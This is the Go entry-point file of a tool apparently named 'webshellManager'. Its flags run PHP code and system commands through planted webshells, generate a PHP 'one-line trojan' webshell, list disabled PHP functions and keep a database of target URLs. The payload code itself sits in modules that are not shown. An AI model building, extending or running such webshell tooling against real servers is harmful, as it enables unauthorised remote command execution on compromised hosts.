package main

import (
	"flag"
	"fmt"
	"os"
	"webshellManager/database"
	"webshellManager/php"
	shell2 "webshellManager/shell"
	"webshellManager/util"
)

func checkFile() {
	_, err := os.Stat("test.db")
	if err == nil {
	} else if os.IsNotExist(err) {
		fmt.Println("检测到数据库配置文件不存在，将创建数据库!")
		database.CreateTable()
	} else {
		fmt.Printf("检查文件错误: %v\n", err)
	}
}

func main() {
	checkFile()
	showHelp := flag.Bool("help", false, "显示帮助信息")
	code := flag.String("code", "", "执行 PHP 代码")
	shell := flag.String("shell", "", "利用 system 函数执行系统命令")
	webShell := flag.Bool("generate-shell", false, "生成 PHP 的一句话木马")
	dbInfo := flag.Bool("dbinfo", false, "显示目前数据库信息")
	addDb := flag.Bool("adddb", false, "添加数据")
	disableFunction := flag.Bool("disableFunction", false, "查看 PHP 禁用的函数")

	flag.Parse()

	if *showHelp {
		util.PrintLogo()
	} else if *code != "" {
		executeCode, err := php.ExecuteCode(*code)
		{
			util.HandleError(err, "错误")
			fmt.Println(*executeCode)
		}
	} else if *shell != "" {
		execShell, err := shell2.ExecShell(*shell)
		{
			util.HandleError(err, "错误")
			fmt.Println(*execShell)
		}
	} else if *webShell {
		php.GenerateWebShell()
	} else if *dbInfo {
		database.ALLDB()
	} else if *addDb {
		database.AddURL()
	} else if *disableFunction {
		php.DisableFunctionInfo()
	} else {
		util.PrintLogo()
	}

}
